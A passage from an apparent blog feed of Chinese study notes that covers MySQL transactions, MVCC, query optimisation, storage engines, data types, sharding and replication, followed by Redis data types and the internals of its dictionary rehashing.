<p>但是对于特大型的表，建立和维护索引的代价将会随之增长。这种情况下，需要用到一种技术可以直接区分出需要查询的一组数据，而不是一条记录一条记录地匹配，例如可以使用分区技术。</p>
</li>
</ul>
<h1 id="二、mysql事务" tabindex="-1"> 二、MySQL事务</h1>
<h2 id="重做日志-redo-log" tabindex="-1"> 重做日志 redo log</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-08-20-20-34-35.png" alt="" loading="lazy"></p>
<p>redo log重做日志，主要的流程如上图。当得到数据操作的要求时候，从磁盘读取数据，然后在内存缓存中修改数据。并将操作行为记录进redo log buffer，并同时将数据写到磁盘。4、5两部是同时进行的。</p>
<h2 id="回滚日志-undo-log" tabindex="-1"> 回滚日志 undo log</h2>
<p>undo log主要是对于事务之前的数据状态进行记录。以便在事务提交失败之后，根据undo log进行ROLLBACK。</p>
<h3 id="insert-undo-log" tabindex="-1"> insert undo log</h3>
<p>代表事务在insert新记录时产生的undo log, 只在事务回滚时需要，并且在事务提交后可以被立即丢弃</p>
<h3 id="update-undo-log" tabindex="-1"> update undo log</h3>
<p>事务在进行update或delete时产生的undo log; 不仅在事务回滚时需要，在快照读时也需要；所以不能随便删除，只有在快速读或事务回滚不涉及该日志时，对应的日志才会被purge线程统一清除</p>
<h2 id="mvcc实现" tabindex="-1"> MVCC实现</h2>
<p>MVCC的目的就是多版本并发控制，在数据库中的实现，就是为了解决读写冲突，它的实现原理主要是依赖记录中的2个隐式字段，undo日志 ，Read View 来实现的</p>
<p>InnoDB为数据库中存储的每行数据添加两个字段来实现MVCC：</p>
<ul>
<li>事务版本号（DB_TRX_ID ），记录了数据的最后一次更新（INSERT/UPDATE)的事务ID</li>
<li>回滚指针（DB_ROLL_PTR） ，指向当前数据的undo log记录</li>
</ul>
<p>此外，还有</p>
<ul>
<li>隐藏主键（DB_ROW_ID），标行标识（隐藏单调自增id）</li>
<li>删除位（DELETE_BIT），标识该记录是否被删除，物理删除是在mysql进行数据的GC，清理历史版本数据的时候。</li>
</ul>
<h3 id="undo-log" tabindex="-1"> undo log</h3>
<p>对MVCC有帮助的实质是update undo log ，undo log实际上就是存在rollback segment中旧记录链</p>
<ul>
<li>purge线程</li>
</ul>
<blockquote>
<p>从前面的分析可以看出，为了实现InnoDB的MVCC机制，更新或者删除操作都只是设置一下老记录的deleted_bit，并不真正将过时的记录删除。
为了节省磁盘空间，InnoDB有专门的purge线程来清理deleted_bit为true的记录。为了不影响MVCC的正常工作，purge线程自己也维护了一个read view（这个read view相当于系统中最老活跃事务的read view）;如果某个记录的deleted_bit为true，并且DB_TRX_ID相对于purge线程的read view可见，那么这条记录一定是可以被安全清除的。</p>
</blockquote>
<h3 id="readview" tabindex="-1"> ReadView</h3>
<p>Read View就是事务进行快照读操作的时候生产的读视图(Read View)，在该事务执行的快照读的那一刻，会生成数据库系统当前的一个快照，记录并维护系统当前活跃事务的ID</p>
<p>正是Read View生成时机的不同，从而造成RC,RR级别下快照读的结果的不同。
在RC隔离级别下，是每个快照读都会生成并获取最新的Read View；而在RR隔离级别下，则是同一个事务中的第一个快照读才会创建Read View, 之后的快照读获取的都是同一个Read View。</p>
<h4 id="repeatable-read" tabindex="-1"> REPEATABLE READ</h4>
<p>在RR级别下的某个事务的对某条记录的第一次快照读会创建一个快照及Read View, 将当前系统活跃的其他事务记录起来，此后在调用快照读的时候，还是使用的是同一个Read View，所以只要当前事务在其他事务提交更新之前使用过快照读，那么之后的快照读使用的都是同一个Read View，所以对之后的修改不可见；</p>
<p>即RR级别下，快照读生成Read View时，Read View会记录此时所有其他活动事务的快照，这些事务的修改对于当前事务都是不可见的。而早于Read View创建的事务所做的修改均是可见</p>
<h4 id="read-committed" tabindex="-1"> READ COMMITTED</h4>
<p>而在RC级别下的，事务中，每次快照读都会新生成一个快照和Read View, 这就是我们在RC级别下的事务中可以看到别的事务提交的更新的原因</p>
<h1 id="三、查询性能优化" tabindex="-1"> 三、查询性能优化</h1>
<h2 id="使用-explain-进行分析" tabindex="-1"> 使用 Explain 进行分析</h2>
<p>Explain 用来分析 SELECT 查询语句，开发人员可以通过分析 Explain 结果来优化查询语句。</p>
<p>比较重要的字段有：</p>
<ul>
<li>select_type : 查询类型，有简单查询、联合查询、子查询等</li>
<li>key : 使用的索引</li>
<li>rows : 扫描的行数</li>
</ul>
<h2 id="优化数据访问" tabindex="-1"> 优化数据访问</h2>
<h3 id="_1-减少请求的数据量" tabindex="-1"> 1. 减少请求的数据量</h3>
<ul>
<li>只返回必要的列：最好不要使用 SELECT * 语句。</li>
<li>只返回必要的行：使用 LIMIT 语句来限制返回的数据。</li>
<li>缓存重复查询的数据：使用缓存可以避免在数据库中进行查询，特别在要查询的数据经常被重复查询时，缓存带来的查询性能提升将会是非常明显的。</li>
</ul>
<h3 id="_2-减少服务器端扫描的行数" tabindex="-1"> 2. 减少服务器端扫描的行数</h3>
<p>最有效的方式是使用索引来覆盖查询。</p>
<h2 id="重构查询方式" tabindex="-1"> 重构查询方式</h2>
<h3 id="_1-切分大查询" tabindex="-1"> 1. 切分大查询</h3>
<p>一个大查询如果一次性执行的话，可能一次锁住很多数据、占满整个事务日志、耗尽系统资源、阻塞很多小的但重要的查询。</p>
<div><pre><code><span>DELETE</span> <span>FROM</span> messages <span>WHERE</span> <span>create</span> <span>&lt;</span> DATE_SUB<span>(</span><span>NOW</span><span>(</span><span>)</span><span>,</span> <span>INTERVAL</span> <span>3</span> <span>MONTH</span><span>)</span><span>;</span>
</code></pre></div><div><pre><code>rows_affected <span>=</span> <span>0</span>
<span>do</span> {
    rows_affected <span>=</span> do_query<span>(</span>
    <span>"DELETE FROM messages WHERE create  &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH) LIMIT 10000"</span><span>)</span>
} <span>while</span> rows_affected <span>></span> <span>0</span>
</code></pre></div><h3 id="_2-分解大连接查询" tabindex="-1"> 2. 分解大连接查询</h3>
<p>将一个大连接查询分解成对每一个表进行一次单表查询，然后在应用程序中进行关联，这样做的好处有：</p>
<ul>
<li>让缓存更高效。对于连接查询，如果其中一个表发生变化，那么整个查询缓存就无法使用。而分解后的多个查询，即使其中一个表发生变化，对其它表的查询缓存依然可以使用。</li>
<li>分解成多个单表查询，这些单表查询的缓存结果更可能被其它查询使用到，从而减少冗余记录的查询。</li>
<li>减少锁竞争；</li>
<li>在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可伸缩。</li>
<li>查询本身效率也可能会有所提升。例如下面的例子中，使用 IN() 代替连接查询，可以让 MySQL 按照 ID 顺序进行查询，这可能比随机的连接要更高效。</li>
</ul>
<div><pre><code><span>SELECT</span> <span>*</span> <span>FROM</span> tag
<span>JOIN</span> tag_post <span>ON</span> tag_post<span>.</span>tag_id<span>=</span>tag<span>.</span>id
<span>JOIN</span> post <span>ON</span> tag_post<span>.</span>post_id<span>=</span>post<span>.</span>id
<span>WHERE</span> tag<span>.</span>tag<span>=</span><span>'mysql'</span><span>;</span>
</code></pre></div><div><pre><code><span>SELECT</span> <span>*</span> <span>FROM</span> tag <span>WHERE</span> tag<span>=</span><span>'mysql'</span><span>;</span>
<span>SELECT</span> <span>*</span> <span>FROM</span> tag_post <span>WHERE</span> tag_id<span>=</span><span>1234</span><span>;</span>
<span>SELECT</span> <span>*</span> <span>FROM</span> post <span>WHERE</span> post<span>.</span>id <span>IN</span> <span>(</span><span>123</span><span>,</span><span>456</span><span>,</span><span>567</span><span>,</span><span>9098</span><span>,</span><span>8904</span><span>)</span><span>;</span>
</code></pre></div><h1 id="四、存储引擎" tabindex="-1"> 四、存储引擎</h1>
<h2 id="innodb" tabindex="-1"> InnoDB</h2>
<p>是 MySQL 默认的事务型存储引擎，只有在需要它不支持的特性时，才考虑使用其它存储引擎。</p>
<p>实现了四个标准的隔离级别，默认级别是可重复读（REPEATABLE READ）。在可重复读隔离级别下，通过多版本并发控制（MVCC）+ Next-Key Locking 防止幻影读。</p>
<p>主索引是聚簇索引，在索引中保存了数据，从而避免直接读取磁盘，因此对查询性能有很大的提升。</p>
<p>内部做了很多优化，包括从磁盘读取数据时采用的可预测性读、能够加快读操作并且自动创建的自适应哈希索引、能够加速插入操作的插入缓冲区等。</p>
<p>支持真正的在线热备份。其它存储引擎不支持在线热备份，要获取一致性视图需要停止对所有表的写入，而在读写混合场景中，停止写入可能也意味着停止读取。</p>
<h2 id="myisam" tabindex="-1"> MyISAM</h2>
<p>设计简单，数据以紧密格式存储。对于只读数据，或者表比较小、可以容忍修复操作，则依然可以使用它。</p>
<p>提供了大量的特性，包括压缩表、空间数据索引等。</p>
<p>不支持事务。</p>
<p>不支持行级锁，只能对整张表加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但在表有读取操作的同时，也可以往表中插入新的记录，这被称为并发插入（CONCURRENT INSERT）。</p>
<p>可以手工或者自动执行检查和修复操作，但是和事务恢复以及崩溃恢复不同，可能导致一些数据丢失，而且修复操作是非常慢的。</p>
<p>如果指定了 DELAY_KEY_WRITE 选项，在每次修改执行完成时，不会立即将修改的索引数据写入磁盘，而是会写到内存中的键缓冲区，只有在清理键缓冲区或者关闭表的时候才会将对应的索引块写入磁盘。这种方式可以极大的提升写入性能，但是在数据库或者主机崩溃时会造成索引损坏，需要执行修复操作。</p>
<h2 id="比较" tabindex="-1"> 比较</h2>
<ul>
<li>
<p>事务：InnoDB 是事务型的，可以使用 Commit 和 Rollback 语句。</p>
</li>
<li>
<p>并发：MyISAM 只支持表级锁，而 InnoDB 还支持行级锁。</p>
</li>
<li>
<p>外键：InnoDB 支持外键。</p>
</li>
<li>
<p>备份：InnoDB 支持在线热备份。</p>
</li>
<li>
<p>崩溃恢复：MyISAM 崩溃后发生损坏的概率比 InnoDB 高很多，而且恢复的速度也更慢。</p>
</li>
<li>
<p>其它特性：MyISAM 支持压缩表和空间数据索引。</p>
</li>
</ul>
<h1 id="五、数据类型" tabindex="-1"> 五、数据类型</h1>
<h2 id="整型" tabindex="-1"> 整型</h2>
<p>TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT 分别使用 8, 16, 24, 32, 64 位存储空间，一般情况下越小的列越好。</p>
<p>INT(11) 中的数字只是规定了交互工具显示字符的个数，对于存储和计算来说是没有意义的。</p>
<h2 id="浮点数" tabindex="-1"> 浮点数</h2>
<p>FLOAT 和 DOUBLE 为浮点类型，DECIMAL 为高精度小数类型。CPU 原生支持浮点运算，但是不支持 DECIMAl 类型的计算，因此 DECIMAL 的计算比浮点类型需要更高的代价。</p>
<p>FLOAT、DOUBLE 和 DECIMAL 都可以指定列宽，例如 DECIMAL(18, 9) 表示总共 18 位，取 9 位存储小数部分，剩下 9 位存储整数部分。</p>
<h2 id="字符串" tabindex="-1"> 字符串</h2>
<p>主要有 CHAR 和 VARCHAR 两种类型，一种是定长的，一种是变长的。</p>
<p>VARCHAR 这种变长类型能够节省空间，因为只需要存储必要的内容。但是在执行 UPDATE 时可能会使行变得比原来长，当超出一个页所能容纳的大小时，就要执行额外的操作。MyISAM 会将行拆成不同的片段存储，而 InnoDB 则需要分裂页来使行放进页内。</p>
<p>在进行存储和检索时，会保留 VARCHAR 末尾的空格，而会删除 CHAR 末尾的空格。</p>
<h2 id="时间和日期" tabindex="-1"> 时间和日期</h2>
<p>MySQL 提供了两种相似的日期时间类型：DATETIME 和 TIMESTAMP。</p>
<h3 id="_1-datetime" tabindex="-1"> 1. DATETIME</h3>
<p>能够保存从 1000 年到 9999 年的日期和时间，精度为秒，使用 8 字节的存储空间。</p>
<p>它与时区无关。</p>
<p>默认情况下，MySQL 以一种可排序的、无歧义的格式显示 DATETIME 值，例如“2008-01-16 22<span>:</span>37<span>:</span>08”，这是 ANSI 标准定义的日期和时间表示方法。</p>
<h3 id="_2-timestamp" tabindex="-1"> 2. TIMESTAMP</h3>
<p>和 UNIX 时间戳相同，保存从 1970 年 1 月 1 日午夜（格林威治时间）以来的秒数，使用 4 个字节，只能表示从 1970 年到 2038 年。</p>
<p>它和时区有关，也就是说一个时间戳在不同的时区所代表的具体时间是不同的。</p>
<p>MySQL 提供了 FROM_UNIXTIME() 函数把 UNIX 时间戳转换为日期，并提供了 UNIX_TIMESTAMP() 函数把日期转换为 UNIX 时间戳。</p>
<p>默认情况下，如果插入时没有指定 TIMESTAMP 列的值，会将这个值设置为当前时间。</p>
<p>应该尽量使用 TIMESTAMP，因为它比 DATETIME 空间效率更高。</p>
<h1 id="六、切分" tabindex="-1"> 六、切分</h1>
<h2 id="水平切分" tabindex="-1"> 水平切分</h2>
<p>水平切分又称为 Sharding，它是将同一个表中的记录拆分到多个结构相同的表中。</p>
<p>当一个表的数据不断增多时，Sharding 是必然的选择，它可以将数据分布到集群的不同节点上，从而缓存单个数据库的压力。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/63c2909f-0c5f-496f-9fe5-ee9176b31aba.jpg" width="300px"> </div><br>
<h2 id="垂直切分" tabindex="-1"> 垂直切分</h2>
<p>垂直切分是将一张表按列切分成多个表，通常是按照列的关系密集程度进行切分，也可以利用垂直切分将经常被使用的列和不经常被使用的列切分到不同的表中。</p>
<p>在数据库的层面使用垂直切分将按数据库中表的密集程度部署到不同的库中，例如将原来的电商数据库垂直切分成商品数据库、用户数据库等。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e130e5b8-b19a-4f1e-b860-223040525cf6.jpg" width="300px"> </div><br>
<h2 id="sharding-策略" tabindex="-1"> Sharding 策略</h2>
<ul>
<li>哈希取模：hash(key) % N；</li>
<li>范围：可以是 ID 范围也可以是时间范围；</li>
<li>映射表：使用单独的一个数据库来存储映射关系。</li>
</ul>
<h2 id="sharding-存在的问题" tabindex="-1"> Sharding 存在的问题</h2>
<h3 id="_1-事务问题" tabindex="-1"> 1. 事务问题</h3>
<p>使用分布式事务来解决，比如 XA 接口。</p>
<h3 id="_2-连接" tabindex="-1"> 2. 连接</h3>
<p>可以将原来的连接分解成多个单表查询，然后在用户程序中进行连接。</p>
<h3 id="_3-id-唯一性" tabindex="-1"> 3. ID 唯一性</h3>
<ul>
<li>使用全局唯一 ID（GUID）</li>
<li>为每个分片指定一个 ID 范围</li>
<li>分布式 ID 生成器 (如 Twitter 的 Snowflake 算法)</li>
</ul>
<h1 id="七、复制" tabindex="-1"> 七、复制</h1>
<h2 id="主从复制" tabindex="-1"> 主从复制</h2>
<p>主要涉及三个线程：binlog 线程、I/O 线程和 SQL 线程。</p>
<ul>
<li><strong>binlog 线程</strong> ：负责将主服务器上的数据更改写入二进制日志（Binary log）中。</li>
<li><strong>I/O 线程</strong> ：负责从主服务器上读取二进制日志，并写入从服务器的中继日志（Relay log）。</li>
<li><strong>SQL 线程</strong> ：负责读取中继日志，解析出主服务器已经执行的数据更改并在从服务器中重放（Replay）。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/master-slave.png" width="300px"> </div><br>
<h2 id="读写分离" tabindex="-1"> 读写分离</h2>
<p>主服务器处理写操作以及实时性要求比较高的读操作，而从服务器处理读操作。</p>
<p>读写分离能提高性能的原因在于：</p>
<ul>
<li>主从服务器负责各自的读和写，极大程度缓解了锁的争用；</li>
<li>从服务器可以使用 MyISAM，提升查询性能以及节约系统开销；</li>
<li>增加冗余，提高可用性。</li>
</ul>
<p>读写分离常用代理方式来实现，代理服务器接收应用层传来的读写请求，然后决定转发到哪个服务器。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/master-slave-proxy.png" width="350px"> </div><br>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>BaronScbwartz, PeterZaitsev, VadimTkacbenko, 等. 高性能 MySQL[M]. 电子工业出版社, 2013.</li>
<li>姜承尧. MySQL 技术内幕: InnoDB 存储引擎 [M]. 机械工业出版社, 2011.</li>
<li><a href="https://www.jfox.info/20-tiao-mysql-xing-nen-you-hua-de-zui-jia-jing-yan.html" target="_blank" rel="noopener noreferrer">20+ 条 MySQL 性能优化的最佳经验</a></li>
<li><a href="http://blog.720ui.com/2017/mysql_core_09_multi_db_table2/" title="服务端指南 数据存储篇 | MySQL（09） 分库与分表带来的分布式困境与应对之策" target="_blank" rel="noopener noreferrer">服务端指南 数据存储篇 | MySQL（09） 分库与分表带来的分布式困境与应对之策</a></li>
<li><a href="https://stackoverflow.com/questions/788829/how-to-create-unique-row-id-in-sharded-databases" target="_blank" rel="noopener noreferrer">How to create unique row ID in sharded databases?</a></li>
<li><a href="http://geekswithblogs.net/shaunxu/archive/2012/01/07/sql-azure-federation-ndash-introduction.aspx" title="Title of this entry." target="_blank" rel="noopener noreferrer">SQL Azure Federation – Introduction</a></li>
<li><a href="http://blog.codinglabs.org/articles/theory-of-mysql-index.html" target="_blank" rel="noopener noreferrer">MySQL 索引背后的数据结构及算法原理</a></li>
<li><a href="https://segmentfault.com/a/1190000008131735" target="_blank" rel="noopener noreferrer">MySQL 性能优化神器 Explain 使用分析</a></li>
<li><a href="https://medium.com/@jeeyoungk/how-sharding-works-b4dec46b3f6" target="_blank" rel="noopener noreferrer">How Sharding Works</a></li>
<li><a href="https://tech.meituan.com/dianping_order_db_sharding.html" target="_blank" rel="noopener noreferrer">大众点评订单系统分库分表实践</a></li>
<li><a href="https://zh.wikipedia.org/wiki/B%2B%E6%A0%91" target="_blank" rel="noopener noreferrer">B + 树</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">数据库</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、概述</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li>
<ul>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="一、概述" tabindex="-1"> 一、概述</h1>
<p>Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。</p>
<p>键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。</p>
<p>Redis 支持很多特性，例如将内存中的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能。</p>
<h1 id="二、数据类型" tabindex="-1"> 二、数据类型</h1>
<table>
<thead>
<tr>
<th style="text-align:center">数据类型</th>
<th style="text-align:center">可以存储的值</th>
<th style="text-align:center">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">STRING</td>
<td style="text-align:center">字符串、整数或者浮点数</td>
<td style="text-align:center">对整个字符串或者字符串的其中一部分执行操作<br> 对整数和浮点数执行自增或者自减操作</td>
</tr>
<tr>
<td style="text-align:center">LIST</td>
<td style="text-align:center">列表</td>
<td style="text-align:center">从两端压入或者弹出元素 <br> 对单个或者多个元素进行修剪，<br> 只保留一个范围内的元素</td>
</tr>
<tr>
<td style="text-align:center">SET</td>
<td style="text-align:center">无序集合</td>
<td style="text-align:center">添加、获取、移除单个元素<br> 检查一个元素是否存在于集合中<br> 计算交集、并集、差集<br> 从集合里面随机获取元素</td>
</tr>
<tr>
<td style="text-align:center">HASH</td>
<td style="text-align:center">包含键值对的无序散列表</td>
<td style="text-align:center">添加、获取、移除单个键值对<br> 获取所有键值对<br> 检查某个键是否存在</td>
</tr>
<tr>
<td style="text-align:center">ZSET</td>
<td style="text-align:center">有序集合</td>
<td style="text-align:center">添加、获取、删除元素<br> 根据分值范围或者成员来获取元素<br> 计算一个键的排名</td>
</tr>
</tbody>
</table>
<blockquote>
<p><a href="https://redislabs.com/ebook/part-1-getting-started/chapter-1-getting-to-know-redis/1-2-what-redis-data-structures-look-like/" target="_blank" rel="noopener noreferrer">What Redis data structures look like</a></p>
</blockquote>
<p><img src="@source/assets/cs-note/distribute/mk-2020-09-01-09-54-41.png" alt="" loading="lazy"></p>
<div><pre><code>REDIS_ENCODING_INT（<span>long</span> 类型的整数）
REDIS_ENCODING_EMBSTR embstr （编码的简单动态字符串）
REDIS_ENCODING_RAW （简单动态字符串）
REDIS_ENCODING_HT （字典）
REDIS_ENCODING_LINKEDLIST （双端链表）
REDIS_ENCODING_ZIPLIST （压缩列表）
REDIS_ENCODING_INTSET （整数集合）
REDIS_ENCODING_SKIPLIST （跳跃表和字典）
</code></pre></div><h2 id="string" tabindex="-1"> STRING</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6019b2db-bc3e-4408-b6d8-96025f4481d6.png" width="400"/> </div><br>
<div><pre><code>> set hello world
OK
> get hello
"world"
> del hello
(integer) 1
> get hello
(nil)
</code></pre></div><h3 id="数据结构实现" tabindex="-1"> 数据结构实现</h3>
<ul>
<li>int：8个字节的长整型</li>
<li>embstr：小于等于39个字节的字符串</li>
<li>raw：大于39个字节的字符串</li>
</ul>
<h2 id="list" tabindex="-1"> LIST</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fb327611-7e2b-4f2f-9f5b-38592d408f07.png" width="400"/> </div><br>
<div><pre><code>> rpush list-key item
(integer) 1
> rpush list-key item2
(integer) 2
> rpush list-key item
(integer) 3

> lrange list-key 0 -1
1) "item"
2) "item2"
3) "item"

> lindex list-key 1
"item2"

> lpop list-key
"item"

> lrange list-key 0 -1
1) "item2"
2) "item"
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><h3 id="数据结构实现-1" tabindex="-1"> 数据结构实现</h3>
<ul>
<li>ziplist:
<ul>
<li>列表对象保存的所有字符串元素的长度都小于64字节；</li>
<li>列表元素保存的元素数量小于512个；</li>
</ul>
</li>
<li>linkedlist</li>
</ul>
<h2 id="set" tabindex="-1"> SET</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cd5fbcff-3f35-43a6-8ffa-082a93ce0f0e.png" width="400"/> </div><br>
<div><pre><code>> sadd set-key item
(integer) 1
> sadd set-key item2
(integer) 1
> sadd set-key item3
(integer) 1
> sadd set-key item
(integer) 0

> smembers set-key
1) "item"
2) "item2"
3) "item3"

> sismember set-key item4
(integer) 0
> sismember set-key item
(integer) 1

> srem set-key item2
(integer) 1
> srem set-key item2
(integer) 0

> smembers set-key
1) "item"
2) "item3"
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><h3 id="数据结构实现-2" tabindex="-1"> 数据结构实现</h3>
<ul>
<li>intset
<ul>
<li>集合对象保存的所有元素都是整数值；</li>
<li>集合对象保存的元素数量不超过 512 个；</li>
</ul>
</li>
<li>hashtable</li>
</ul>
<h2 id="hash" tabindex="-1"> HASH</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7bd202a7-93d4-4f3a-a878-af68ae25539a.png" width="400"/> </div><br>
<div><pre><code>> hset hash-key sub-key1 value1
(integer) 1
> hset hash-key sub-key2 value2
(integer) 1
> hset hash-key sub-key1 value1
(integer) 0

> hgetall hash-key
1) "sub-key1"
2) "value1"
3) "sub-key2"
4) "value2"

> hdel hash-key sub-key2
(integer) 1
> hdel hash-key sub-key2
(integer) 0

> hget hash-key sub-key1
"value1"

> hgetall hash-key
1) "sub-key1"
2) "value1"
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div><h3 id="数据结构实现-3" tabindex="-1"> 数据结构实现</h3>
<ul>
<li>ziplist:
<ul>
<li>哈希对象保存的所有键值对的键和值的字符串长度都小于 64 字节；</li>
<li>哈希对象保存的键值对数量小于 512 个；</li>
</ul>
</li>
<li>hashtable</li>
</ul>
<h4 id="字典" tabindex="-1"> 字典</h4>
<p>dictht 是一个散列表结构，使用拉链法解决哈希冲突。</p>
<div><pre><code><span>/* This is our hash table structure. Every dictionary has two of this as we
 * implement incremental rehashing, for the old to the new table. */</span>
<span>typedef</span> <span>struct</span> <span>dictht</span> <span>{</span>
    dictEntry <span>*</span><span>*</span>table<span>;</span>
    <span>unsigned</span> <span>long</span> size<span>;</span>
    <span>unsigned</span> <span>long</span> sizemask<span>;</span>
    <span>unsigned</span> <span>long</span> used<span>;</span>
<span>}</span> dictht<span>;</span>
</code></pre></div><div><pre><code><span>typedef</span> <span>struct</span> <span>dictEntry</span> <span>{</span>
    <span>void</span> <span>*</span>key<span>;</span>
    <span>union</span> <span>{</span>
        <span>void</span> <span>*</span>val<span>;</span>
        <span>uint64_t</span> u64<span>;</span>
        <span>int64_t</span> s64<span>;</span>
        <span>double</span> d<span>;</span>
    <span>}</span> v<span>;</span>
    <span>struct</span> <span>dictEntry</span> <span>*</span>next<span>;</span>
<span>}</span> dictEntry<span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><p>Redis 的字典 dict 中包含两个哈希表 dictht，这是为了方便进行 rehash 操作。在扩容时，将其中一个 dictht 上的键值对 rehash 到另一个 dictht 上面，完成之后释放空间并交换两个 dictht 的角色。</p>
<div><pre><code><span>typedef</span> <span>struct</span> <span>dict</span> <span>{</span>
    dictType <span>*</span>type<span>;</span>
    <span>void</span> <span>*</span>privdata<span>;</span>
    dictht ht<span>[</span><span>2</span><span>]</span><span>;</span>
    <span>long</span> rehashidx<span>;</span> <span>/* rehashing not in progress if rehashidx == -1 */</span>
    <span>unsigned</span> <span>long</span> iterators<span>;</span> <span>/* number of iterators currently running */</span>
<span>}</span> dict<span>;</span>
</code></pre></div><p>rehash 操作不是一次性完成，而是采用渐进方式，这是为了避免一次性执行过多的 rehash 操作给服务器带来过大的负担。</p>
<p>渐进式 rehash 通过记录 dict 的 rehashidx 完成，它从 0 开始，然后每执行一次 rehash 都会递增。例如在一次 rehash 中，要把 dict[0] rehash 到 dict[1]，这一次会把 dict[0] 上 table[rehashidx] 的键值对 rehash 到 dict[1] 上，dict[0] 的 table[rehashidx] 指向 null，并令 rehashidx++。</p>
<p>因为在进行渐进式 rehash 的过程中， 字典会同时使用 ht[0] 和 ht1 两个哈希表， 所以在渐进式 rehash 进行期间， 字典的删除（delete）、查找（find）、更新（update）等操作会在两个哈希表上进行： 比如说， 要在字典里面查找一个键的话， 程序会先在 ht[0] 里面进行查找， 如果没找到的话， 就会继续到 ht1 里面进行查找， 诸如此类。</p>
<p>另外， 在渐进式 rehash 执行期间， 新添加到字典的键值对一律会被保存到 ht1 里面， 而 ht[0] 则不再进行任何添加操作： 这一措施保证了 ht[0] 包含的键值对数量会只减不增， 并随着 rehash 操作的执行而最终变成空表。</p>
<p>要点</p>
<ul>
<li>字典使用哈希表作为底层实现， 每个字典带有两个哈希表， 一个用于平时使用， 另一个仅在进行 rehash 时使用</li>
<li>当哈希表保存的键值对数量太多或者太少时， 程序需要对哈希表的大小进行相应的扩展或者收缩（rehash）</li>
<li>rehash 动作并不是一次性、集中式地完成的， 而是分多次、渐进式地完成的</li>
<li>渐进式 rehash 的过程中， 字典会同时使用 ht[0] 和 ht[1] 两个哈希表</li>
</ul>
<h2 id="zset" tabindex="-1"> ZSET</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1202b2d6-9469-4251-bd47-ca6034fb6116.png" width="400"/> </div><br>
